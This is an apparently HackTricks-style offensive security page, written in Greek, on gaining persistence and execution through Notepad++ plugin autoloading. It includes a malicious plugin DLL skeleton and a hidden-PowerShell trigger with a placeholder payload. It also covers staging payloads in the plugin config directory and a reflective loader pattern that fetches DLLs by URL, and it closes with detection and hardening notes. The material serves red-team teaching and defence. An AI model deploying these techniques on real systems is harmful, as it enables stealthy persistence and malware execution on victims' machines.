# Persistence & Execution μέσω αυτόματης φόρτωσης Plugin του Notepad++

{{#include ../../banners/hacktricks-training.md}}

Το Notepad++ θα κάνει **autoload κάθε plugin DLL που βρίσκεται κάτω από τους υποφακέλους `plugins`** κατά την εκκίνηση. Η τοποθέτηση ενός malicious plugin σε οποιαδήποτε **εγγράψιμη εγκατάσταση του Notepad++** παρέχει code execution μέσα στο `notepad++.exe` κάθε φορά που ξεκινά ο editor, γεγονός που μπορεί να αξιοποιηθεί για **persistence**, stealthy **initial execution** ή ως **in-process loader** όταν ο editor εκκινείται με elevated privileges.<sup>[[1]](#references)</sup>

Από το **Notepad++ 7.6+**, η αναμενόμενη διάταξη για manual installation είναι **ένας υποφάκελος ανά plugin** (`plugins\<PluginName>\<PluginName>.dll`). Σε **portable mode** (παρουσία του `doLocalConf.xml` δίπλα στο `notepad++.exe`), ολόκληρο το application tree παραμένει τοπικά σε αυτόν τον κατάλογο, μετατρέποντας συχνά τα αντιγραμμένα/admin tool bundles σε εύκολη user-writable επιφάνεια εκτέλεσης.<sup>[[2]](#references)</sup>

## Εγγράψιμες τοποθεσίες plugin

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (συνήθως απαιτεί admin για εγγραφή).<sup>[[1]](#references)</sup>
- Writable options για low-privileged operators:<sup>[[1]](#references)</sup>
- Χρησιμοποιήστε το **portable Notepad++ build** σε user-writable φάκελο.
- Αντιγράψτε το `C:\Program Files\Notepad++` σε user-controlled path (π.χ. `%LOCALAPPDATA%\npp\`) και εκτελέστε το `notepad++.exe` από εκεί.
- Αναζητήστε **admin tool bundles**, extracted zip copies ή help-desk toolkits που ήδη περιέχουν το `doLocalConf.xml` και βρίσκονται εκτός του `Program Files`.
- Κάθε plugin αποκτά τον δικό του υποφάκελο κάτω από το `plugins` και φορτώνεται αυτόματα κατά το startup· οι καταχωρίσεις του menu εμφανίζονται κάτω από το **Plugins**.<sup>[[2]](#references)</sup>

Γρήγορο triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Το Notepad++ αναμένει συγκεκριμένες **exported functions**. Όλες καλούνται κατά την αρχικοποίηση, παρέχοντας πολλαπλές επιφάνειες εκτέλεσης:<sup>[[1]](#references)</sup>
- **`DllMain`** — εκτελείται αμέσως κατά τη φόρτωση του DLL (πρώτο σημείο εκτέλεσης).
- **`setInfo(NppData)`** — καλείται μία φορά κατά τη φόρτωση για την παροχή των handles του Notepad++; συνήθης θέση για την καταχώριση στοιχείων μενού.
- **`getName()`** — επιστρέφει το όνομα του plugin που εμφανίζεται στο μενού.
- **`getFuncsArray(int *nbF)`** — επιστρέφει τις εντολές μενού· ακόμη και αν είναι κενό, καλείται κατά την εκκίνηση.
- **`beNotified(SCNotification*)`** — λαμβάνει συμβάντα του Notepad++ / Scintilla (χρήσιμο για την αναβολή payloads μέχρι την ενέργεια ενός χρήστη ή ένα συμβάν του editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, χρήσιμος για μεγαλύτερες ανταλλαγές δεδομένων.
- **`isUnicode()`** — compatibility flag που ελέγχεται κατά τη φόρτωση.

Τα περισσότερα exports μπορούν να υλοποιηθούν ως **stubs**· η εκτέλεση μπορεί να πραγματοποιηθεί από το `DllMain` ή οποιοδήποτε callback παραπάνω κατά το autoload.

## Minimal malicious plugin skeleton
Κάντε compile ένα DLL με τα αναμενόμενα exports και τοποθετήστε το στο `plugins\\MyNewPlugin\\MyNewPlugin.dll`, μέσα σε έναν εγγράψιμο φάκελο του Notepad++:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Κάντε build το DLL (Visual Studio/MinGW).
2. Δημιουργήστε τον υποφάκελο του plugin μέσα στο `plugins` και τοποθετήστε το DLL στο εσωτερικό του.
3. Κάντε επανεκκίνηση του Notepad++; το DLL φορτώνεται αυτόματα, εκτελώντας το `DllMain` και τα επακόλουθα callbacks.

## Μοτίβο trigger χαμηλού θορύβου μέσω `beNotified`
Για OPSEC, πολλά payloads δεν πρέπει να εκτελούνται από το `DllMain`. Ένα πιο αθόρυβο μοτίβο είναι να επιτρέψετε στο plugin να φορτωθεί κανονικά και, στη συνέχεια, να εκτελείται μόνο μετά από ένα ρεαλιστικό event του editor, όπως η **ολοκλήρωση της εκκίνησης**, η **ενεργοποίηση buffer** ή ο **πρώτος χαρακτήρας που πληκτρολογείται**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Αυτό ταιριάζει περισσότερο με τη δημόσια offensive έρευνα από ένα θορυβώδες beacon στο `DllMain`: το DLL εξακολουθεί να φορτώνεται αυτόματα κατά την εκκίνηση, αλλά η κακόβουλη ενέργεια καθυστερεί μέχρι το Notepad++ να φαίνεται ότι χρησιμοποιείται πραγματικά.

## Χρήση του plugin config directory ως δευτερεύοντος χώρου αποθήκευσης
Το Notepad++ εκθέτει το `NPPM_GETPLUGINSCONFIGDIR`, το οποίο επιστρέφει το **plugin configuration directory του τρέχοντος χρήστη**.<sup>[[3]](#references)</sup> Ένα κακόβουλο plugin μπορεί να το χρησιμοποιήσει ώστε το DLL στον δίσκο να παραμένει ελάχιστο, αποθηκεύοντας παράλληλα κρυπτογραφημένα αρχεία ρυθμίσεων, staged payloads ή αρχεία tasking σε μια διαδρομή που ενσωματώνεται στη φυσιολογική κατάσταση του plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Λειτουργικά, αυτό είναι χρήσιμο όταν θέλετε:
- ένα μικρό autoloaded bootstrap DLL·
- tasking ανά χρήστη χωρίς να αγγίξετε ξανά το κύριο plugin binary·
- να διαχωρίσετε το **autoload trigger** από το βαρύτερο second stage.

## Μοτίβο plugin Reflective loader
Ένα weaponized plugin μπορεί να μετατρέψει το Notepad++ σε **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Να εμφανίζει μια minimal καταχώριση UI/menu (π.χ. "LoadDLL").
- Να δέχεται μια **διαδρομή αρχείου** ή **URL** για τη λήψη ενός payload DLL.
- Να κάνει reflective map το DLL στην τρέχουσα διεργασία και να καλεί ένα exported entry point (π.χ. μια loader function μέσα στο DLL που λήφθηκε).
- Όφελος: επαναχρησιμοποίηση μιας GUI διεργασίας που φαίνεται benign αντί για δημιουργία νέου loader· το payload κληρονομεί το integrity του `notepad++.exe` (συμπεριλαμβανομένων elevated contexts).
- Συμβιβασμοί: η εγγραφή ενός **unsigned plugin DLL** στον δίσκο είναι θορυβώδης· μια πρακτική παραλλαγή είναι να χρησιμοποιείται το autoloaded plugin μόνο ως stub και να διατηρείται το πραγματικό implant κρυπτογραφημένο/staged αλλού.

## Σημειώσεις για detection και hardening
- Αποκλείστε ή παρακολουθείτε **εγγραφές στους καταλόγους plugin του Notepad++** (συμπεριλαμβανομένων portable copies σε user profiles)· ενεργοποιήστε το controlled folder access ή application allowlisting.
- Δημιουργήστε alert για **νέα unsigned DLLs** κάτω από το `plugins`, αλλαγές σε portable Notepad++ trees και ασυνήθιστα **child processes/network activity** από το `notepad++.exe`.
- Καταγράψτε ως baseline τα νόμιμα plugins και διερευνήστε κάθε νέο DLL που κάνει export το κανονικό Notepad++ plugin interface αλλά επίσης δημιουργεί shells, PowerShell ή network beacons.
- Επιβάλετε την εγκατάσταση plugin μόνο μέσω του **Plugins Admin** και περιορίστε την εκτέλεση portable copies από untrusted paths.

## Αναφορές

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
